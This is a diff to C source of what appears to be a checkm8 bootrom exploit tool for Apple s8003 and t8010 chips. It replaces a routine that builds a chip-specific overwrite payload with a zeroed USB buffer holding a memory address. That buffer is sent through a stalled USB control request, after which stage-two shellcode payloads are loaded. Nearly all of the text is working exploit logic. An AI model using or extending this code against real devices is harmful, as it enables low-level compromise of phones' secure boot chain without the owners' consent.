@@ -84,15 +84,12 @@ typedef struct {
 	uint32_t sz;
 } transfer_ret_t;
 
-extern uint8_t payloads_overwrite_bin[];
-extern unsigned payloads_overwrite_bin_len;
 extern uint8_t payloads_yolo_s8003_bin[], payloads_yolo_t8010_bin[];
 extern unsigned payloads_yolo_s8003_bin_len, payloads_yolo_t8010_bin_len;
 
 extern uint8_t payloads_Pongo_bin[], payloads_shellcode_bin[];
 extern unsigned payloads_Pongo_bin_len, payloads_shellcode_bin_len;
 
-#include <payloads/overwrite.bin.h>
 #include <payloads/yolo_s8003.bin.h>
 #include <payloads/yolo_t8010.bin.h>
 
@@ -851,44 +848,16 @@ checkm8_stage_spray(const usb_handle_t *handle) {
 	return true;
 }
 
-static void
-generate_overwrite(void **overwrite, size_t *overwrite_sz) {
-	*overwrite = calloc(1, payloads_overwrite_bin_len);
-	*overwrite_sz = 0;
-	memcpy(*overwrite, payloads_overwrite_bin, payloads_overwrite_bin_len);
-	*overwrite_sz += payloads_overwrite_bin_len;
-	uint32_t* offset = (uint32_t*)(*overwrite + 0x27);
-	LOG_DEBUG("before: %08x", *offset);
-	switch (cpid) {
-		case 0x8003:
-			LOG_DEBUG("creating overwrite for s8003");
-			*offset = 0x1803800;
-			break;
-		case 0x8010:
-			LOG_DEBUG("creating overwrite for t8010");
-			*offset = 0x1800B00;
-			break;
-		default:
-			LOG_ERROR("unknown cpid: %04x", cpid);
-			exit(EXIT_FAILURE);
-	}
-	LOG_DEBUG("after: %08x", *offset);
-	*overwrite_sz += 2;
-	for(size_t i = 0; i < *overwrite_sz - 2; i++) {
-		((uint8_t *)*overwrite)[*overwrite_sz - 1 - i] = ((uint8_t *)*overwrite)[*overwrite_sz - 3 - i];
-	}
-	((uint8_t *)*overwrite)[0] = 0x00;
-	((uint8_t *)*overwrite)[1] = 0x00;
-}
-
 static bool
 checkm8_stage_patch(const usb_handle_t *handle) {
 	size_t i, data_sz, packet_sz;
 	uint8_t *data;
 	transfer_ret_t transfer_ret;
 	bool ret = false;
-	void *overwrite;
-	size_t overwrite_sz;
+	void* blank[DFU_MAX_TRANSFER_SZ];
+	memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
+	uint64_t* p = (uint64_t*)blank;
+    p[5] = insecure_memory_base;
 	switch (cpid) {
 		case 0x8003:
 			LOG_DEBUG("setting up stage 2 for s8003");
@@ -896,7 +865,6 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			data_sz = 0;
 			memcpy(data, payloads_yolo_s8003_bin, payloads_yolo_s8003_bin_len);
 			data_sz += payloads_yolo_s8003_bin_len;
-			generate_overwrite(&overwrite, &overwrite_sz);
 			break;
 		case 0x8010:
 			LOG_DEBUG("setting up stage 2 for t8010");
@@ -904,7 +872,6 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			data_sz = 0;
 			memcpy(data, payloads_yolo_t8010_bin, payloads_yolo_t8010_bin_len);
 			data_sz += payloads_yolo_t8010_bin_len;
-			generate_overwrite(&overwrite, &overwrite_sz);
 			if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
 				LOG_DEBUG("successfully leaked data");
 			} else {
@@ -920,7 +887,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		LOG_DEBUG("i = %zu", i);
 		send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, NULL);
 	}
-	if(overwrite != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
+	if(p != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, p, 0x30, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
 		ret = true;
 		for(i = 0; ret && i < data_sz; i += packet_sz) {
 			packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
@@ -937,7 +904,6 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		}
 	}
 	free(data);
-	free(overwrite);
 	return ret;
 }
 
